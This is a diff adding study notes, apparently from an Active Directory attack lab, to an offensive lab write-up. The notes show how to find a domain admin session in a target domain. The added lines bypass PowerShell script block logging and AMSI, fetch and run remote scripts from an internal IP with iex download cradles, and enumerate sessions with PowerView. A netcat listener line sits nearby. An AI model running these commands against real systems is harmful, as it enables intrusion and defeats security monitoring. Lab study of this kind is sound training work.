@@ -87,4 +87,21 @@
   nc64.exe -lvp 443
   Build
   
+# Learning Objective 7
+- Identify a machine in the target domain where a Domain Admin session is available. 
+  That is using Find-DomainUserLocation. First, we must bypass AMSIand enhanced logging.
+  The below command bypasses Enhanced Script Block Logging. Unfortuantely, we have no in-memory bypass for PowerShell transcripts.Note that we couldalso paste the contents of sbloggingbypass.txt in place of the download-execcradle.
+  1. iex (iwr http://172.16.100.75/sbloggingbypass.txt -UseBasicParsing) 
+  2. AMSI Bypass
+  3. iex ((New-Object Net.WebClient).DownloadString('http://172.16.100.75/PowerView.ps1'))
+  4. Find-DomainUserLocation
+  
+  (There is adomain admin session on dcorp-mgmtserver!)
+  
+  Now we can abuse this using PowerShell Remoting
+  
+  
+  
+  
+  
   
